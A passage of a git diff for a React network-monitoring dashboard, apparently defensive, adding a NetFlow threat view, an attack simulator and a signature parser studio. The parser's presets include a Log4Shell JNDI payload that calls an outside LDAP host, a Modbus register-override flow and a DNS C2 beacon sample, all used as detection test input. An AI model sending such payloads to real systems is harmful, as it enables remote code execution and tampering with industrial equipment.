+                    "px-2.5 py-1 rounded-lg text-xs font-bold transition-all flex items-center gap-1.5",
+                    showThreatHalo ? "bg-red-600/30 text-red-400 border border-red-500/40" : "text-gray-500 hover:text-gray-300"
+                  )}
+                  title={isZh ? '開關威脅節點示警光暈' : 'Toggle threat beacon'}
+                >
+                  <Flame size={13} />
+                  <span className="hidden sm:inline text-[10px]">{isZh ? '威脅光暈' : 'Threats'}</span>
+                </button>
+              </div>
+
               <div className="relative">
                 <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500" />
                 <input
@@ -1032,7 +1556,7 @@ export default function NetworkMonitorView() {
                   placeholder={isZh ? '搜尋設備名稱 / IP / MAC...' : 'Search device, IP, MAC...'}
                   value={searchQuery}
                   onChange={(e) => setSearchQuery(e.target.value)}
-                  className="pl-8 pr-4 py-1.5 bg-black/40 border border-gray-800 rounded-xl text-xs text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 w-56"
+                  className="pl-8 pr-4 py-1.5 bg-black/40 border border-gray-800 rounded-xl text-xs text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 w-52"
                 />
               </div>
             </div>
@@ -1049,6 +1573,11 @@ export default function NetworkMonitorView() {
                   setSelectedDeviceId(device ? device.id : null);
                   setInspectedDevice(device);
                 }}
+                showFlowAnimation={showFlowAnimation}
+                showBandwidthBadges={showBandwidthBadges}
+                showThreatHalo={showThreatHalo}
+                flows={flows}
+                onSelectLink={(link) => setSelectedLink(link)}
                 isZh={isZh}
               />
             </div>
@@ -1209,6 +1738,82 @@ export default function NetworkMonitorView() {
                         ))}
                       </div>
                     )}
+
+                    {/* Associated NetFlow Active Sessions */}
+                    {(() => {
+                      const devFlows = flows.filter(f => 
+                        f.srcDeviceId === inspectedDevice.id || 
+                        f.dstDeviceId === inspectedDevice.id || 
+                        f.srcIp.includes(inspectedDevice.ip.split(' ')[0]) || 
+                        f.dstIp.includes(inspectedDevice.ip.split(' ')[0])
+                      );
+                      const malFlow = devFlows.find(f => f.threatLevel === 'malicious' && f.status === 'active');
+
+                      return (
+                        <div className="space-y-2">
+                          <h4 className="text-[11px] font-black text-gray-400 uppercase tracking-wider border-b border-gray-800 pb-1.5 flex items-center justify-between">
+                            <span>{isZh ? '關聯 NetFlow 活躍連線' : 'Active Flow Sessions'}</span>
+                            <span className="text-blue-400 font-mono text-[10px]">{devFlows.length} 條</span>
+                          </h4>
+
+                          {malFlow && (
+                            <div className="p-3 bg-red-950/40 border border-red-500/40 rounded-2xl space-y-2 shadow-inner">
+                              <div className="flex items-center justify-between">
+                                <span className="text-red-400 font-black text-xs flex items-center gap-1.5">
+                                  <ShieldAlert size={14} className="animate-pulse" />
+                                  {isZh ? '活躍惡意攻擊流' : 'Malicious Flow'}
+                                </span>
+                                <button
+                                  onClick={() => handleBlockFlow(malFlow.id)}
+                                  className="px-2 py-0.5 bg-red-600 hover:bg-red-500 text-white rounded-lg text-[10px] font-bold transition-all shadow"
+                                >
+                                  {isZh ? '立即阻斷此流' : 'Drop'}
+                                </button>
+                              </div>
+                              <p className="text-[11px] text-red-200">
+                                [{malFlow.signatureMatch?.signatureId}] {malFlow.signatureMatch?.signatureName}
+                              </p>
+                              <p className="text-[10px] font-mono text-gray-400">
+                                {malFlow.srcIp}:{malFlow.srcPort} ➔ {malFlow.dstIp}:{malFlow.dstPort} ({malFlow.protocol})
+                              </p>
+                            </div>
+                          )}
+
+                          <div className="space-y-1.5 max-h-36 overflow-y-auto custom-scrollbar">
+                            {devFlows.length === 0 ? (
+                              <p className="text-[11px] text-gray-500">{isZh ? '目前無即時流動通訊階段' : 'No active flow sessions'}</p>
+                            ) : (
+                              devFlows.slice(0, 4).map(f => (
+                                <div key={f.id} className="p-2 bg-[#09090b] border border-gray-800 rounded-xl flex items-center justify-between text-[10px] font-mono">
+                                  <div>
+                                    <span className="text-gray-300 font-bold">{f.protocol}</span>
+                                    <span className="text-gray-500 ml-1.5">{f.srcIp === inspectedDevice.ip.split(' ')[0] ? `-> ${f.dstIp}:${f.dstPort}` : `<- ${f.srcIp}:${f.srcPort}`}</span>
+                                  </div>
+                                  <div className="flex items-center gap-1.5">
+                                    <span className={cn(
+                                      "px-1.5 py-0.5 rounded text-[9px] font-bold uppercase",
+                                      f.threatLevel === 'malicious' ? "bg-red-500/15 text-red-400" :
+                                      f.threatLevel === 'suspicious' ? "bg-amber-500/15 text-amber-400" : "bg-emerald-500/15 text-emerald-400"
+                                    )}>
+                                      {f.threatLevel}
+                                    </span>
+                                    {f.status === 'active' && f.threatLevel !== 'normal' && (
+                                      <button
+                                        onClick={() => handleBlockFlow(f.id)}
+                                        className="text-red-400 hover:text-red-300 font-bold"
+                                        title={isZh ? '阻斷' : 'Drop'}
+                                      >
+                                        <XCircle size={12} />
+                                      </button>
+                                    )}
+                                  </div>
+                                </div>
+                              ))
+                            )}
+                          </div>
+                        </div>
+                      );
+                    })()}
                   </div>
 
                   {/* Actions Toolbar */}
@@ -1262,6 +1867,850 @@ export default function NetworkMonitorView() {
                 </motion.div>
               )}
             </AnimatePresence>
+          </div>
+        </div>
+      ) : viewMode === 'flows' ? (
+        /* NETFLOW & THREAT FLOW STREAM VIEW */
+        <div className="space-y-4">
+          {/* Malicious Threats Alert Banner */}
+          {kpiStats.activeMaliciousFlows > 0 && (
+            <div className="p-4 bg-gradient-to-r from-red-950/60 via-red-900/30 to-[#111114] border border-red-500/50 rounded-3xl flex flex-wrap items-center justify-between gap-4 shadow-2xl">
+              <div className="flex items-center gap-3">
+                <div className="p-3 bg-red-600/20 border border-red-500/40 rounded-2xl text-red-400 animate-pulse">
+                  <ShieldAlert size={24} />
+                </div>
+                <div>
+                  <h3 className="text-sm font-black text-white flex items-center gap-2">
+                    <span>{isZh ? `全網 NetFlow 捕獲 ${kpiStats.activeMaliciousFlows} 條高危惡意攻擊流` : `${kpiStats.activeMaliciousFlows} Malicious Flows Detected`}</span>
+                    <span className="px-2 py-0.5 text-[10px] font-mono font-bold bg-red-500/20 border border-red-500/40 text-red-400 rounded-full">
+                      CRITICAL ALERT
+                    </span>
+                  </h3>
+                  <p className="text-xs text-red-300/80 mt-0.5">
+                    {isZh 
+                      ? '核心交換機/防火牆 NetFlow DPI 探針已匹配特徵碼，建議立即下發 ACL 阻斷或隔離主機以避免災情蔓延。' 
+                      : 'NetFlow probe matched attack signatures. Immediate ACL drop or quarantine recommended.'}
+                  </p>
+                </div>
+              </div>
+              <div className="flex items-center gap-2">
+                <button
+                  onClick={handleClearAllThreats}
+                  className="px-4 py-2 bg-red-600 hover:bg-red-500 text-white rounded-xl text-xs font-black uppercase tracking-wider transition-all flex items-center gap-2 shadow-lg shadow-red-600/30"
+                >
+                  <ShieldX size={14} />
+                  <span>{isZh ? '一鍵全網阻斷全部威脅' : 'Emergency Drop All'}</span>
+                </button>
+              </div>
+            </div>
+          )}
+
+          {/* Autonomous NetFlow / sFlow / IPFIX Collector Control & Telemetry Panel */}
+          <div className="bg-[#111114] border border-gray-800/80 rounded-3xl p-5 space-y-4 shadow-xl">
+            <div className="flex flex-wrap items-center justify-between gap-4 pb-3 border-b border-gray-800/60">
+              <div className="flex items-center gap-3">
+                <div className={cn(
+                  "p-2.5 rounded-2xl border transition-all",
+                  collectorStatus?.metrics?.isRunning !== false
+                    ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-400"
+                    : "bg-amber-500/10 border-amber-500/30 text-amber-400"
+                )}>
+                  <RadioTower size={20} className={collectorStatus?.metrics?.isRunning !== false ? "animate-pulse" : ""} />
+                </div>
+                <div>
+                  <div className="flex items-center gap-2">
+                    <h3 className="text-sm font-black text-white tracking-wide">
+                      {isZh ? 'NetFlow / IPFIX 即時流量收集器引擎' : 'Autonomous NetFlow / IPFIX Collector Engine'}
+                    </h3>
+                    <span className={cn(
+                      "px-2 py-0.5 rounded-full text-[10px] font-mono font-bold uppercase tracking-wider inline-flex items-center gap-1.5",
+                      collectorStatus?.metrics?.isRunning !== false
+                        ? "bg-emerald-500/20 text-emerald-400 border border-emerald-500/30"
+                        : "bg-amber-500/20 text-amber-400 border border-amber-500/30"
+                    )}>
+                      <span className={cn("w-1.5 h-1.5 rounded-full", collectorStatus?.metrics?.isRunning !== false ? "bg-emerald-400 animate-ping" : "bg-amber-400")} />
+                      {collectorStatus?.metrics?.isRunning !== false ? (isZh ? '即時取樣中 (RUNNING)' : 'INGESTING') : (isZh ? '已暫停 (PAUSED)' : 'PAUSED')}
+                    </span>
+                    <span className="text-[10px] text-gray-500 font-mono">
+                      v4.8 • {collectorStatus?.metrics?.workerThreads || 8} Workers
+                    </span>
+                  </div>
+                  <p className="text-xs text-gray-400 mt-0.5">
+                    {isZh 
+                      ? '持續自核心骨幹交換機、邊界防火牆與 OT 工控網閘收集 5-Tuple NetFlow 記錄，並執行特徵碼即時比對' 
+                      : 'Continuously sampling 5-tuple flow records across core backbone, gateway and OT diodes with real-time heuristic inspection.'}
+                  </p>
+                </div>
+              </div>
+
+              {/* Engine Control Toolbar */}
+              <div className="flex flex-wrap items-center gap-2">
+                {/* Toggle Engine Button */}
+                <button
+                  onClick={handleToggleCollector}
+                  disabled={isTogglingCollector}
+                  className={cn(
+                    "px-3 py-1.5 rounded-xl text-xs font-bold transition-all flex items-center gap-1.5 shadow-sm",
+                    collectorStatus?.metrics?.isRunning !== false
+                      ? "bg-amber-600/20 hover:bg-amber-600 text-amber-400 hover:text-white border border-amber-500/30"
+                      : "bg-emerald-600/20 hover:bg-emerald-600 text-emerald-400 hover:text-white border border-emerald-500/30"
+                  )}
+                  title={isZh ? '啟動或暫停後端即時收集串流' : 'Toggle Flow Collector Ingestion'}
+                >
+                  {collectorStatus?.metrics?.isRunning !== false ? (
+                    <>
+                      <Pause size={13} />
+                      <span>{isZh ? '暫停收集' : 'Pause'}</span>
+                    </>
+                  ) : (
+                    <>
+                      <Play size={13} />
+                      <span>{isZh ? '啟動收集' : 'Resume'}</span>
+                    </>
+                  )}
+                </button>
+
+                {/* Sampling Ratio Selector */}
+                <div className="flex items-center bg-[#0c0c0e] border border-gray-800 rounded-xl p-0.5 text-xs">
+                  <span className="text-[10px] text-gray-500 font-bold px-2">{isZh ? '採樣率:' : 'Ratio:'}</span>
+                  {(['1:100', '1:500', '1:1000'] as const).map(ratio => (
+                    <button
+                      key={ratio}
+                      onClick={() => handleChangeSamplingRatio(ratio)}
+                      className={cn(
+                        "px-2 py-1 rounded-lg text-[10px] font-mono font-bold transition-all",
+                        (collectorStatus?.config?.samplingRatio || '1:100') === ratio
+                          ? "bg-blue-600 text-white shadow-sm"
+                          : "text-gray-400 hover:text-white"
+                      )}
+                    >
+                      {ratio}
+                    </button>
+                  ))}
+                </div>
+
+                {/* Monitored Interfaces Modal Trigger */}
+                <button
+                  onClick={fetchCollectorInterfaces}
+                  className="px-3 py-1.5 rounded-xl text-xs font-bold bg-[#0c0c0e] hover:bg-gray-800 text-gray-300 hover:text-white border border-gray-800 transition-all flex items-center gap-1.5"
+                  title={isZh ? '檢視收集器監聽交換機介面狀態' : 'View Monitored Interfaces'}
+                >
+                  <Server size={13} className="text-cyan-400" />
+                  <span>{isZh ? '監聽介面 (5)' : 'Interfaces'}</span>
+                </button>
+
+                {/* Inject Sample Flow */}
+                <button
+                  onClick={() => setInjectModalOpen(true)}
+                  className="px-3 py-1.5 rounded-xl text-xs font-bold bg-[#0c0c0e] hover:bg-gray-800 text-gray-300 hover:text-white border border-gray-800 transition-all flex items-center gap-1.5"
+                  title={isZh ? '手動注入自訂 NetFlow 測試封包流' : 'Inject Custom Flow'}
+                >
+                  <Zap size={13} className="text-amber-400" />
+                  <span>{isZh ? '手動注入流' : 'Inject Flow'}</span>
+                </button>
+
+                {/* Flush Buffer Button */}
+                <button
+                  onClick={handleFlushCollector}
+                  className="px-2.5 py-1.5 rounded-xl text-xs font-bold bg-[#0c0c0e] hover:bg-gray-800 text-gray-400 hover:text-white border border-gray-800 transition-all"
+                  title={isZh ? '重置流量記憶體緩衝' : 'Flush Buffer'}
+                >
+                  <RotateCcw size={13} />
+                </button>
+
+                {/* Export CSV Download Link */}
+                <a
+                  href="/api/v1/network/flows/export"
+                  download
+                  className="px-3 py-1.5 rounded-xl text-xs font-bold bg-blue-600/20 hover:bg-blue-600 text-blue-400 hover:text-white border border-blue-500/30 transition-all flex items-center gap-1.5"
+                  title={isZh ? '匯出 NetFlow CSV 格式' : 'Export Flow CSV'}
+                >
+                  <Download size={13} />
+                  <span>{isZh ? '匯出 CSV' : 'Export'}</span>
+                </a>
+              </div>
+            </div>
+
+            {/* 4 KPIs Cards */}
+            <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
+              <div className="bg-[#0c0c0e] border border-gray-800/80 rounded-2xl p-3">
+                <span className="text-[10px] text-gray-500 uppercase tracking-wider font-bold block">
+                  {isZh ? '即時採樣速率 (PPS)' : 'Sampling Ingest Rate'}
+                </span>
+                <div className="flex items-baseline gap-1 mt-1">
+                  <span className="text-lg font-black font-mono text-white">
+                    {(collectorStatus?.metrics?.ingestionRatePps || flowStats?.collectorEngine?.ingestionRatePps || 18450).toLocaleString()}
+                  </span>
+                  <span className="text-[10px] text-gray-500 font-mono">pps</span>
+                </div>
+                <span className="text-[10px] text-emerald-400 flex items-center gap-1 mt-0.5">
+                  <Activity size={10} /> {isZh ? '線路零丟包取樣' : '0 Packet Drop'}
+                </span>
+              </div>
+
+              <div className="bg-[#0c0c0e] border border-gray-800/80 rounded-2xl p-3">
+                <span className="text-[10px] text-gray-500 uppercase tracking-wider font-bold block">
+                  {isZh ? '全網彙總頻寬 (BPS)' : 'Aggregated Bandwidth'}
+                </span>
+                <div className="flex items-baseline gap-1 mt-1">
+                  <span className="text-lg font-black font-mono text-white">
+                    {collectorStatus?.metrics?.throughputMbps || flowStats?.collectorEngine?.throughputMbps || '48.20'}
+                  </span>
+                  <span className="text-[10px] text-gray-500 font-mono">Mbps</span>
+                </div>
+                <span className="text-[10px] text-blue-400 flex items-center gap-1 mt-0.5">
+                  <Waves size={10} /> {isZh ? '多介面彙流' : 'LACP Port-Channel'}
+                </span>
+              </div>
+
+              <div className="bg-[#0c0c0e] border border-gray-800/80 rounded-2xl p-3">
+                <span className="text-[10px] text-gray-500 uppercase tracking-wider font-bold block">
+                  {isZh ? '作用中連線 Session' : 'Active Flow Sessions'}
+                </span>
+                <div className="flex items-baseline gap-1 mt-1">
+                  <span className="text-lg font-black font-mono text-white">
+                    {collectorStatus?.metrics?.activeFlowsCount || flowStats?.activeFlows || flows.filter(f => f.status === 'active').length}
+                  </span>
+                  <span className="text-[10px] text-gray-500 font-mono">flows</span>
+                </div>
+                <span className="text-[10px] text-purple-400 flex items-center gap-1 mt-0.5">
+                  <Layers size={10} /> {isZh ? '5-Tuple 即時狀態追蹤' : '5-Tuple State Machine'}
+                </span>
+              </div>
+
+              <div className="bg-[#0c0c0e] border border-gray-800/80 rounded-2xl p-3">
+                <div className="flex justify-between items-center">
+                  <span className="text-[10px] text-gray-500 uppercase tracking-wider font-bold">
+                    {isZh ? '記憶體環狀緩衝' : 'Ring Buffer Depth'}
+                  </span>
+                  <span className="text-[10px] font-mono text-gray-400">
+                    {flows.length} / {collectorStatus?.config?.maxFlowsBuffer || 600}
+                  </span>
+                </div>
+                <div className="flex items-baseline gap-1 mt-1">
+                  <span className="text-lg font-black font-mono text-white">
+                    {collectorStatus?.metrics?.bufferUtilizationPct || Number(((flows.length / 600) * 100).toFixed(1))}%
+                  </span>
+                  <span className="text-[10px] text-gray-500 font-mono">{isZh ? '負載' : 'load'}</span>
+                </div>
+                <div className="w-full bg-gray-800 h-1.5 rounded-full overflow-hidden mt-1">
+                  <div 
+                    className="bg-blue-500 h-full rounded-full transition-all duration-500"
+                    style={{ width: `${Math.min(100, collectorStatus?.metrics?.bufferUtilizationPct || (flows.length / 6))}%` }}
+                  />
+                </div>
+              </div>
+            </div>
+          </div>
+
+          {/* Quick Attack Simulator Bar */}
+          <div className="bg-[#111114] border border-gray-800/80 p-4 rounded-2xl flex flex-wrap items-center justify-between gap-3">
+            <div className="flex items-center gap-2 text-xs font-bold text-gray-400">
+              <Flame size={16} className="text-amber-400" />
+              <span>{isZh ? 'NetFlow 威脅測試模擬器：' : 'Flow Simulator:'}</span>
+            </div>
+            <div className="flex flex-wrap items-center gap-1.5">
+              {[
+                { type: 'log4j', label: isZh ? '⚡ Log4Shell 注入' : 'Log4Shell RCE', color: 'hover:border-red-500 text-red-400' },
+                { type: 'modbus_exploit', label: isZh ? '🏭 工控 Modbus 覆寫' : 'Modbus FC 0x06', color: 'hover:border-amber-500 text-amber-400' },
+                { type: 'c2_beacon', label: isZh ? '🤖 Cobalt Strike C2' : 'DNS Tunneling C2', color: 'hover:border-purple-500 text-purple-400' },
+                { type: 'syn_flood', label: isZh ? '💥 SYN Flood DDoS' : 'SYN Flood 320k pps', color: 'hover:border-orange-500 text-orange-400' },
+                { type: 's7comm_exploit', label: isZh ? '⚙️ 西門子 S7Comm 停機' : 'S7Comm Exploit', color: 'hover:border-yellow-500 text-yellow-400' },
+                { type: 'exfiltration', label: isZh ? '☁️ 雲端巨量外洩' : 'Cloud Exfil 14GB', color: 'hover:border-blue-500 text-blue-400' },
+                { type: 'recon_scan', label: isZh ? '🔍 內網特權探針' : 'Recon SMB Sweep', color: 'hover:border-cyan-500 text-cyan-400' }
+              ].map(sim => (
+                <button
+                  key={sim.type}
+                  onClick={() => handleSimulateAttack(sim.type)}
+                  disabled={simulatingAttack}
+                  className={cn(
+                    "px-3 py-1.5 rounded-xl text-xs font-bold bg-[#0c0c0e] border border-gray-800 transition-all shadow-sm hover:bg-gray-800",
+                    sim.color
+                  )}
+                >
+                  {sim.label}
+                </button>
+              ))}
+            </div>
+          </div>
+
+          {/* Filter Toolbar for Flows */}
+          <div className="p-4 bg-[#111114] border border-gray-800/80 rounded-2xl flex flex-wrap items-center justify-between gap-3">
+            <div className="flex flex-wrap items-center gap-2">
+              <span className="text-xs font-bold text-gray-400 flex items-center gap-1.5 mr-1">
+                <Filter size={14} className="text-blue-400" /> {isZh ? '威脅等級：' : 'Threat Level:'}
+              </span>
+              {[
+                { id: 'all', label: isZh ? '全部 (All)' : 'All' },
+                { id: 'malicious', label: isZh ? '高危威脅 (Malicious)' : 'Malicious' },
+                { id: 'suspicious', label: isZh ? '可疑異常 (Suspicious)' : 'Suspicious' },
+                { id: 'normal', label: isZh ? '正常流量 (Normal)' : 'Normal' }
+              ].map(t => (
+                <button
+                  key={t.id}
+                  onClick={() => setFlowFilterThreat(t.id)}
+                  className={cn(
+                    "px-3 py-1.5 rounded-xl text-xs font-bold transition-all",
+                    flowFilterThreat === t.id 
+                      ? "bg-blue-600 text-white shadow-md shadow-blue-600/20" 
+                      : "bg-gray-800/50 hover:bg-gray-800 text-gray-400 hover:text-white border border-gray-800"
+                  )}
+                >
+                  {t.label}
+                </button>
+              ))}
+
+              <div className="h-4 w-px bg-gray-800 mx-2" />
+
+              {/* Protocol select */}
+              <select
+                value={flowFilterProto}
+                onChange={(e) => setFlowFilterProto(e.target.value)}
+                className="bg-black/40 border border-gray-800 rounded-xl px-3 py-1.5 text-xs text-gray-300 focus:outline-none focus:border-blue-500"
+              >
+                <option value="all">{isZh ? '所有協定 (All Protocols)' : 'All Protocols'}</option>
+                <option value="TCP">TCP</option>
+                <option value="UDP">UDP</option>
+                <option value="Modbus">Modbus (ICS)</option>
+                <option value="S7Comm">S7Comm (ICS)</option>
+                <option value="DNS">DNS</option>
+                <option value="HTTP">HTTP</option>
+                <option value="HTTPS">HTTPS</option>
+              </select>
+
+              {/* Status select */}
+              <select
+                value={flowFilterStatus}
+                onChange={(e) => setFlowFilterStatus(e.target.value)}
+                className="bg-black/40 border border-gray-800 rounded-xl px-3 py-1.5 text-xs text-gray-300 focus:outline-none focus:border-blue-500"
+              >
+                <option value="all">{isZh ? '所有狀態 (All Status)' : 'All Status'}</option>
+                <option value="active">{isZh ? '作用中連線 (Active)' : 'Active'}</option>
+                <option value="blocked">{isZh ? '已阻斷丟棄 (Blocked)' : 'Blocked'}</option>
+              </select>
+            </div>
+
+            <div className="flex items-center gap-3">
+              <div className="relative">
+                <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500" />
+                <input
+                  type="text"
+                  placeholder={isZh ? '搜尋 IP / 連接埠 / 特徵碼名稱...' : 'Search IP, port, signature...'}
+                  value={flowSearchQuery}
+                  onChange={(e) => setFlowSearchQuery(e.target.value)}
+                  className="pl-8 pr-4 py-1.5 bg-black/40 border border-gray-800 rounded-xl text-xs text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 w-64"
+                />
+              </div>
+            </div>
+          </div>
+
+          {/* Flows Table */}
+          <div className="bg-[#111114] border border-gray-800 rounded-3xl overflow-hidden shadow-2xl">
+            <div className="overflow-x-auto">
+              <table className="w-full text-left border-collapse">
+                <thead>
+                  <tr className="border-b border-gray-800 bg-black/30 text-gray-400 text-xs font-bold">
+                    <th className="px-5 py-4">{isZh ? '通訊端點 (來源 -> 目的)' : 'Flow Endpoints (Src -> Dst)'}</th>
+                    <th className="px-4 py-4">{isZh ? '協定與旗標' : 'Proto & Flags'}</th>
+                    <th className="px-4 py-4">{isZh ? '流量吞吐 (速率 / 總量)' : 'Telemetry (Rate / Vol)'}</th>
+                    <th className="px-4 py-4">{isZh ? '威脅判定' : 'Threat Level'}</th>
+                    <th className="px-5 py-4">{isZh ? '命中特徵碼 / MITRE TTP' : 'Signature Match / MITRE'}</th>
+                    <th className="px-4 py-4">{isZh ? '連線狀態' : 'Status'}</th>
+                    <th className="px-5 py-4 text-right">{isZh ? '處置操作' : 'Action'}</th>
+                  </tr>
+                </thead>
+                <tbody className="divide-y divide-gray-800/60 text-xs">
+                  {filteredFlows.length === 0 ? (
+                    <tr>
+                      <td colSpan={7} className="px-6 py-12 text-center text-gray-500">
+                        {isZh ? '未找到符合條件的 NetFlow 串流通訊紀錄' : 'No flow records found matching filters'}
+                      </td>
+                    </tr>
+                  ) : (
+                    filteredFlows.map(flow => (
+                      <tr 
+                        key={flow.id} 
+                        className={cn(
+                          "hover:bg-white/[0.02] transition-colors",
+                          flow.threatLevel === 'malicious' && flow.status === 'active' ? "bg-red-950/10" : ""
+                        )}
+                      >
+                        {/* Endpoints */}
+                        <td className="px-5 py-3.5">
+                          <div className="flex items-center gap-2 font-mono">
+                            <div>
+                              <p className="font-bold text-white text-xs">{flow.srcIp}:{flow.srcPort}</p>
+                              <p className="text-[10px] text-gray-500">{flow.srcDeviceName || 'Flow Exporter'}</p>
+                            </div>
+                            <ArrowRight size={14} className="text-gray-500 shrink-0" />
+                            <div>
+                              <p className="font-bold text-white text-xs">{flow.dstIp}:{flow.dstPort}</p>
+                              <p className="text-[10px] text-gray-500">{flow.dstDeviceName || 'Remote Target'}</p>
+                            </div>
+                          </div>
+                        </td>
+
+                        {/* Proto & Flags */}
+                        <td className="px-4 py-3.5">
+                          <span className={cn(
+                            "px-2 py-0.5 rounded text-[10px] font-bold font-mono",
+                            flow.protocol === 'Modbus' || flow.protocol === 'S7Comm' ? "bg-amber-500/10 text-amber-400 border border-amber-500/20" :
+                            flow.protocol === 'DNS' ? "bg-purple-500/10 text-purple-400 border border-purple-500/20" :
+                            flow.protocol === 'HTTP' || flow.protocol === 'HTTPS' ? "bg-cyan-500/10 text-cyan-400 border border-cyan-500/20" :
+                            "bg-gray-800 text-gray-300"
+                          )}>
+                            {flow.protocol}
+                          </span>
+                          {flow.flags && flow.flags.length > 0 && (
+                            <span className="text-[10px] text-gray-500 font-mono ml-1.5">
+                              [{flow.flags.join(',')}]
+                            </span>
+                          )}
+                        </td>
+
+                        {/* Telemetry */}
+                        <td className="px-4 py-3.5 font-mono">
+                          <p className="text-white font-bold text-xs">
+                            {(flow.bps / 1000000).toFixed(2)} <span className="text-[10px] text-gray-500">Mbps</span>
+                          </p>
+                          <p className="text-[10px] text-gray-400">
+                            {flow.pps?.toLocaleString()} pps • {((flow.bytes || 0) / 1024).toFixed(0)} KB
+                          </p>
+                        </td>
+
+                        {/* Threat Level */}
+                        <td className="px-4 py-3.5">
+                          <span className={cn(
+                            "px-2.5 py-1 rounded-full text-[10px] font-bold font-mono uppercase tracking-wider inline-flex items-center gap-1",
+                            flow.threatLevel === 'malicious' ? "bg-red-500/15 text-red-400 border border-red-500/30 animate-pulse" :
+                            flow.threatLevel === 'suspicious' ? "bg-amber-500/15 text-amber-400 border border-amber-500/30" :
+                            "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20"
+                          )}>
+                            {flow.threatLevel === 'malicious' && <ShieldAlert size={11} />}
+                            {flow.threatLevel === 'suspicious' && <AlertTriangle size={11} />}
+                            {flow.threatLevel === 'normal' && <CheckCircle2 size={11} />}
+                            {flow.threatLevel}
+                          </span>
+                        </td>
+
+                        {/* Signature Match */}
+                        <td className="px-5 py-3.5">
+                          {flow.signatureMatch ? (
+                            <div>
+                              <div className="flex items-center gap-1.5">
+                                <span className="px-1.5 py-0.5 rounded text-[9px] font-mono font-bold bg-purple-500/10 border border-purple-500/25 text-purple-400">
+                                  {flow.signatureMatch.signatureId}
+                                </span>
+                                <span className="font-bold text-white text-xs truncate max-w-[200px]" title={flow.signatureMatch.signatureName}>
+                                  {flow.signatureMatch.signatureName}
+                                </span>
+                              </div>
+                              <p className="text-[10px] text-gray-400 font-mono mt-0.5">
+                                {flow.signatureMatch.mitreTTP} {flow.signatureMatch.cve ? `• ${flow.signatureMatch.cve}` : ''}
+                              </p>
+                            </div>
+                          ) : (
+                            <span className="text-gray-600 text-[11px] font-mono">-- 基準線內正常 --</span>
+                          )}
+                        </td>
+
+                        {/* Status */}
+                        <td className="px-4 py-3.5">
+                          <span className={cn(
+                            "px-2 py-0.5 rounded text-[10px] font-mono font-bold uppercase",
+                            flow.status === 'active' ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20" :
+                            "bg-gray-800 text-gray-400 border border-gray-700"
+                          )}>
+                            {flow.status}
+                          </span>
+                        </td>
+
+                        {/* Action */}
+                        <td className="px-5 py-3.5 text-right space-x-1.5">
+                          {flow.status === 'active' && flow.threatLevel !== 'normal' && (
+                            <button
+                              onClick={() => handleBlockFlow(flow.id)}
+                              className="px-2.5 py-1 bg-red-600/20 hover:bg-red-600 text-red-400 hover:text-white border border-red-500/30 rounded-lg text-xs font-bold transition-all shadow-sm"
+                              title={isZh ? '下發 ACL 規則丟棄此流量' : 'Block Flow'}
+                            >
+                              {isZh ? 'ACL 阻斷' : 'Block'}
+                            </button>
+                          )}
+                          <button
+                            onClick={() => setSelectedFlow(flow)}
+                            className="px-2.5 py-1 bg-gray-800 hover:bg-gray-700 text-gray-300 hover:text-white rounded-lg text-xs font-bold transition-all"
+                            title={isZh ? '檢視流量完整取證資訊' : 'Inspect'}
+                          >
+                            <Eye size={12} className="inline mr-1" />
+                            {isZh ? '取證' : 'Inspect'}
+                          </button>
+                        </td>
+                      </tr>
+                    ))
+                  )}
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+      ) : viewMode === 'signatures' ? (
+        /* ATTACK SIGNATURE CATALOG & LIVE PARSER STUDIO */
+        <div className="space-y-6">
+          {/* Top: Interactive Flow & Payload Signature Parser Studio */}
+          <div className="bg-[#111114] border border-gray-800/80 rounded-3xl p-6 shadow-2xl space-y-6">
+            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-gray-800 pb-5">
+              <div className="flex items-center gap-3">
+                <div className="p-3 bg-purple-600/10 border border-purple-500/20 rounded-2xl text-purple-400">
+                  <Fingerprint size={24} />
+                </div>
+                <div>
+                  <h2 className="text-xl font-black text-white tracking-tight flex items-center gap-2">
+                    {isZh ? '攻擊特徵碼即時解析與規則驗證工作台' : 'Attack Signature & Parser Studio'}
+                    <span className="px-2.5 py-0.5 text-[10px] font-mono font-bold bg-purple-500/10 border border-purple-500/30 text-purple-400 rounded-full">
+                      ICS / NDR / EDR Regex Engine
+                    </span>
+                  </h2>
+                  <p className="text-xs text-gray-400 mt-0.5">
+                    {isZh 
+                      ? '輸入任意未解碼 Payload、Raw Flow 或 Log 文本，即時比對 ATT&CK 特徵碼規則並產出風險評估與應變對策。' 
+                      : 'Parse arbitrary payloads and logs against Mitre ATT&CK signature rules with instant forensics.'}
+                  </p>
+                </div>
+              </div>
+
+              {/* Template quick loader */}
+              <div className="flex items-center gap-2">
+                <span className="text-xs font-bold text-gray-400 hidden sm:inline">{isZh ? '載入攻擊範例：' : 'Preset:'}</span>
+                <select
+                  onChange={(e) => {
+                    const val = e.target.value;
+                    if (val === 'modbus') {
+                      setParserInputText('Flow [Modbus] 10.88.88.103:51240 -> 192.168.100.88:502 bytes=280000 pps=200 flags=PSH,ACK function_code=0x06 holding_reg=40012 override_val=0xFFFF');
+                      setParserProtocol('Modbus');
+                      setParserSrcIp('10.88.88.103');
+                      setParserDstIp('192.168.100.88');
+                      setParserSrcPort('51240');
+                      setParserDstPort('502');
+                    } else if (val === 'log4j') {
+                      setParserInputText('GET /login HTTP/1.1 User-Agent: ${jndi:ldap://185.220.101.45:1389/Exploit} Host: srv-app-01.corp:8080 Accept: */*');
+                      setParserProtocol('HTTP');
+                      setParserSrcIp('185.220.101.45');
+                      setParserDstIp('10.88.88.20');
+                      setParserSrcPort('48920');
+                      setParserDstPort('8080');
+                    } else if (val === 'c2') {
+                      setParserInputText('DNS QUERY TYPE A for abcd1234efgh5678.beacon.c2-empire.xyz from 10.88.88.106 to 198.51.100.15:53 id=0x4141');
+                      setParserProtocol('DNS');
+                      setParserSrcIp('10.88.88.106');
+                      setParserDstIp('198.51.100.15');
+                      setParserSrcPort('53120');
+                      setParserDstPort('53');
+                    } else if (val === 's7comm') {
